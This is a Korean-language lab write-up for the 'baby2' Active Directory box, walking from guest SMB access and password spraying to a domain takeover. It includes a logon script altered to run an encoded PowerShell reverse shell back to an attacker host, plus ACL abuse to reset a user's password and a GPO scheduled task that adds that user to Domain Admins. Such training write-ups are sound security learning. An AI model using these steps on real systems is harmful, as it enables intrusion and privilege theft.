# baby2
## Port Scanning
```bash
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49668,51787,51788,51806,54802,54838 -sC -sV -vv -oA baby2 10.129.234.72
```
<img width="1204" height="249" alt="image" src="https://github.com/user-attachments/assets/6fa48c7e-143f-4143-afd0-96dc3111212e" />
<img width="1204" height="219" alt="image" src="https://github.com/user-attachments/assets/0bea0776-b9a1-4724-8d2d-a393a13f60f4" />
<img width="1204" height="269" alt="image" src="https://github.com/user-attachments/assets/fa01f9bd-1d28-435c-a2af-63f1871ec21a" />

- DNS
- KERBEROS
- LDAP
- SMB
- RDP
- CA(baby2-CA)

<br>

- `/etc/hosts`에 dc.baby2.vl 등록.
<img width="1204" height="79" alt="image" src="https://github.com/user-attachments/assets/ff7259d3-4f35-422e-a44a-cd75d360bc7a" />

## SMB
- guest login 성공.
```bash
nxc smb 10.129.8.152 -u guest -p ''
```
<img width="1204" height="136" alt="image" src="https://github.com/user-attachments/assets/cb3d41a6-d388-4dca-9d9e-954b8311f9ad" />

<br>
<br>

- `rid-brute` 옵션을 사용하여 유저 수집.
```bash
nxc smb 10.129.8.152 -u guest -p '' --rid-brute|grep -i sidtypeuser
```
<img width="1204" height="441" alt="image" src="https://github.com/user-attachments/assets/fcacf27b-8b1d-4c9c-9efd-cf7a5ee9a567" />

## Auth as Carl.Moore
- 수집된 유저들을 유저명으로 로그인시도하여 `Carl.Moore`와 `library` 로그인 성공.
```bash
nxc smb 10.129.8.152 -u users -p users --no-brute --continue-on-success
```
<img width="1204" height="484" alt="image" src="https://github.com/user-attachments/assets/f6aebc66-3368-47a0-ac02-9b1be4b63bf1" />

<br>
<br>

- `Carl.Moore` 로그인 성공.
```bash
nxc smb 10.129.8.152 -u Carl.Moore -p Carl.Moore
```
<img width="1204" height="129" alt="image" src="https://github.com/user-attachments/assets/334a52ec-a526-4cec-910b-2f400340cb2e" />

## Shell as amelia.griffiths
- `/apps`, `/docs`, `/homes` 경로 탐색 가능.
```bash
nxc smb 10.129.8.152 -u Carl.Moore -p Carl.Moore --shares
```
<img width="1204" height="390" alt="image" src="https://github.com/user-attachments/assets/b22f2e9d-8f93-4338-9c98-2952694f98b1" />

<br>
<br>

- `/apps/dev` 경로에서 `login.vbs.lnk`파일 로컬로 다운로드.
```bash
smbclient -U Carl.Moore //10.129.8.152/apps
```
<img width="1204" height="484" alt="image" src="https://github.com/user-attachments/assets/96f5b2c3-fffb-4d2a-8142-8df3ea1bf4c0" />

<br>
<br>

- `lnkinfo`를 사용하여 확인.
- `sysvol` 경로에 실제 파일이 존재하는 것으로 확인 됨.
```bash
lnkinfo login.vbs.lnk
```
<img width="1204" height="654" alt="image" src="https://github.com/user-attachments/assets/119c1b02-0659-4566-94a7-7212e0afa6d5" />

<br>
<br>

- `/sysvol/baby2.vl/scripts`에서 `login.vbs` 다운로드.
```bash
smbclient -U Carl.Moore //10.129.8.152/sysvol
```
<img width="1204" height="677" alt="image" src="https://github.com/user-attachments/assets/f9c3d400-42d0-4878-b87f-3ce5413bd449" />

<br>
<br>

- `Logon Script`는 사용자가 컴퓨터에 로그인하는 순간 자동으로 환경을 세팅해주기 위해서 사용하는데, 보통 `sysvol`경로에 저장.
- `nxc`에서는 해당 폴더에 쓰기 권한이 없다고 나오나, 업로드 시도하여 성공.
<img width="1204" height="52" alt="image" src="https://github.com/user-attachments/assets/33060c7e-6df2-4823-8bc4-9f1dd48fe632" />

<br>
<br>

- `login.vbs`에 셸코드 명령어를 추가하여 저장.
```
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA3ACIALAA5ADAAMAAxACkAOwAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkALQBuAGUAMAApAHsAJABkAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7AHQAcgB5AHsAJABvAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAMwA+ACYAMQAgADQAPgAmADEAIAA1AD4AJgAxACAANgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBjAGEAdABjAGgAewAkAG8APQAkAF8AfABPAHUAdAAtAFMAdAByAGkAbgBnAH0AaQBmACgAWwBzAHQAcgBpAG4AZwBdADoAOgBJAHMATgB1AGwAbABPAHIARQBtAHAAdAB5ACgAJABvACkAKQB7ACQAbwA9ACIAIgB9ACQAcAA9ACIAUABTACAAIgArACgAcAB3AGQAKQAuAFAAYQB0AGgAKwAiAD4AIAAiADsAWwBiAHkAdABlAFsAXQBdACQAcwBiAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAG8AKwAkAHAAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA"
```
<img width="1204" height="395" alt="image" src="https://github.com/user-attachments/assets/85099d72-79e6-4679-84ed-e26299435d42" />

<br>
<br>

- `login.vbs` 업로드.
<img width="1204" height="52" alt="image" src="https://github.com/user-attachments/assets/76064f93-8c67-43ae-aec8-cc56160201a8" />

<br>
<br>

- 약간의 대기 후 `amelia.griffiths`의 셸 획득.
<img width="1204" height="173" alt="image" src="https://github.com/user-attachments/assets/72ee7481-bfc0-45c5-b36c-eb721b7f6156" />

## Auth as GPOADM
- 블러드하운드 정보 수집.
```bash
bloodhound-ce-python -u Carl.Moore -p 'Carl.Moore' -d baby2.vl -c all --zip -ns 10.129.8.152

rusthound-ce -d baby2.vl -u Carl.Moore -p 'Carl.Moore'
```
<img width="1204" height="222" alt="image" src="https://github.com/user-attachments/assets/8af417b7-a59b-4864-884c-fc386c286c4f" />

<br>
<br>

- `amelia.griffiths`는 `legacy` 그룹에 속해있고, `legacy`그룹은 `GPOADM`유저에 대해서 `WriteDacl`권한을 가지고 있음.
<img width="800" height="519" alt="image" src="https://github.com/user-attachments/assets/7ed0a324-253f-42ec-92fc-02f39888ddb4" />

<br>
<br>

- 해당 객체의 `Dacl`을 수정할 수 있는 권한.
- 로컬로부터 `PowerView.ps1`을 다운받아서 `amelia.griffiths`유저에게 모든 권한을 부여한 후 `GPOADM`의 비밀번호 변경 시도.
```powershell
. .\power.ps1

Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths

$cred = ConvertTo-SecureString 'Summer2026!' -AsPlainText -Force

Set-DomainUserPassword GPOADM -AccountPassword $cred
```
<img width="1204" height="99" alt="image" src="https://github.com/user-attachments/assets/c3487bb8-c74a-440a-8673-676bc8a03bd6" />

<br>
<br>

- `gpoadm:Summer2026!' 로그인 시도하여 성공.
```bash
nxc smb 10.129.8.152 -u gpoadm -p 'Summer2026!'
```
<img width="1204" height="128" alt="image" src="https://github.com/user-attachments/assets/89330c20-b764-480f-b39a-8f3d61c93425" />

## Shell as nt authority\system
- `DEFAULT DOMAIN CONTROLLERS POLICY`와 `DEFAULT DOMAIN POLICY` GPO에 대해서 `GenericAll`권한을 가지고 있음.
<img width="938" height="417" alt="image" src="https://github.com/user-attachments/assets/32a495fd-18ee-4523-95d1-0cc747d742e5" />

<br>
<br>

- https://github.com/Hackndo/pyGPOAbuse
- `pyGPOAbuse`를 사용하여 `GPOADM`유저가 가진 권한으로 `Default Domain Policy`에 DC 전용 즉시 실행 예약 작업을 추가
```bash
python3 pygpoabuse.py baby2.vl/gpoadm:'Summer2026!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname test -dc-ip 10.129.8.152 -command 'net group "domain admins" gpoadm /add' -filter-enabled -target-dns-name dc.baby2.vl
```
<img width="1204" height="123" alt="image" src="https://github.com/user-attachments/assets/e1022c9c-2805-4576-97a1-59cd2725aa65" />

<br>
<br>

- 이전과 달리 관리자 권한으로 로그인이 가능.
```bash
nxc smb 10.129.8.152 -u gpoadm -p 'Summer2026!'
```
<img width="1204" height="123" alt="image" src="https://github.com/user-attachments/assets/3d34bd9a-284e-4071-ac5b-b9f677d2353c" />

<br>
<br>

- `psexec`를 사용하여 셸 획득.
```bash
impacket-psexec baby2.vl/gpoadm:'Summer2026!'@10.129.8.152
```
<img width="1204" height="392" alt="image" src="https://github.com/user-attachments/assets/e8478821-fc38-403f-891d-e06fc35ce6b9" />
